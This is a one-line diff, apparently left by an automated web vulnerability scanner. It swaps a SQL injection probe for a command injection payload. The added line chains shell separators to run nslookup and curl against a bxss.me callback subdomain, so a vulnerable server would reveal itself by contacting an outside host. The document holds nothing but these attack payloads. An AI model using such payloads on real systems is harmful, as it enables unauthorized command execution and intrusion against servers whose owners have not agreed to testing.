@@ -1,1 +1,1 @@
--1" OR 3+283-283-1=0+0+0+1 -- 
+;(nslookup -q=cname hitfbfbcqcbvn3c4d6.bxss.me||curl hitfbfbcqcbvn3c4d6.bxss.me)|(nslookup -q=cname hitfbfbcqcbvn3c4d6.bxss.me||curl hitfbfbcqcbvn3c4d6.bxss.me)&(nslookup -q=cname hitfbfbcqcbvn3c4d6.bxss.me||curl hitfbfbcqcbvn3c4d6.bxss.me)
